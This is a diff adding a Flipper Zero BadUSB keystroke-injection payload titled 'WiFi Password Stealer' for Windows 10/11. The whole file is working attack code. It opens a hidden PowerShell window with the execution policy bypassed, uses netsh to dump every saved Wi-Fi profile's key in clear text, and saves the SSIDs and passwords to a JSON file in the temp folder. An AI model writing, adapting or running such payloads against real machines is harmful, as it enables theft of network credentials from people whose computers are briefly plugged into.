@@ -1,0 +1,27 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: WiFi Password Stealer
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1000
+STRING $wifi = @()
+ENTER
+STRING (netsh wlan show profiles) | Select-String ":(.+)$" | ForEach-Object {
+ENTER
+STRING     $name = $_.Matches.Groups[1].Value.Trim()
+ENTER
+STRING     $pass = (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+:(.+)$"
+ENTER
+STRING     if($pass) { $wifi += @{SSID=$name;Password=$pass.Matches.Groups[1].Value.Trim()} }
+ENTER
+STRING }
+ENTER
+STRING $wifi | ConvertTo-Json | Out-File "$env:TEMP\wifi.json"
+ENTER
+STRING exit
+ENTER
